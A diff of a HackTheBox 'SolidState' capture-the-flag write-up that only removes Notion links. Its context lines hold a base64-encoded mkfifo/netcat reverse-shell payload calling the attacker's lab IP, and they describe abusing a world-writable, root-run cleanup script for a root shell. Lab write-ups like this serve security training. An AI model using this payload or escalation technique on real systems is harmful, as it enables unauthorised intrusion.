@@ -218,7 +218,7 @@ Now, I edit the exploit script and change the payload line:
 payload = 'echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTcuMjggNDQzID4vdG1wL2YK" | base64 -d | bash'
 ```
 
-Before running the exploit, I started a [Netcat](https://www.notion.so/Netcat-ee425554c2fd42b4829880bdf43eedaf) listener:
+Before running the exploit, I started a Netcat listener:
 
 ```bash
 ┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
@@ -413,7 +413,7 @@ mindy@solidstate:~$ cat user.txt
 
 ---
 
-While logging in with SSH, I got many errors, these errors where caused by the payload I used earlier with the exploit script. So I logged out and started the netcat listener and logged in again. The [Netcat](https://www.notion.so/Netcat-ee425554c2fd42b4829880bdf43eedaf) listener got a shell:
+While logging in with SSH, I got many errors, these errors where caused by the payload I used earlier with the exploit script. So I logged out and started the netcat listener and logged in again. The Netcat listener got a shell:
 
 ```bash
 ┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
@@ -466,7 +466,7 @@ I found another use called james, but it seems that he does not have any interes
 
 ---
 
-I used [LinEnum & LinPEAS](https://www.notion.so/LinEnum-LinPEAS-247c944d585e40b0809aa2835a9c2ce2) to find interesting files, and I found some world writeable files:
+I used LinPEAS to find interesting files, and I found some world writeable files:
 
 ```bash
 ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                   
@@ -502,7 +502,7 @@ except:
      sys.exit()
 ```
 
-This script clears temp, it may run as root, so I can use this as a privilege escalation. [Netcat](https://www.notion.so/Netcat-ee425554c2fd42b4829880bdf43eedaf) is installed on the machine, so I can use it to get a root shell. I edited it as follows:
+This script clears temp, it may run as root, so I can use this as a privilege escalation. Netcat is installed on the machine, so I can use it to get a root shell. I edited it as follows:
 
 ```bash
 #!/usr/bin/env python
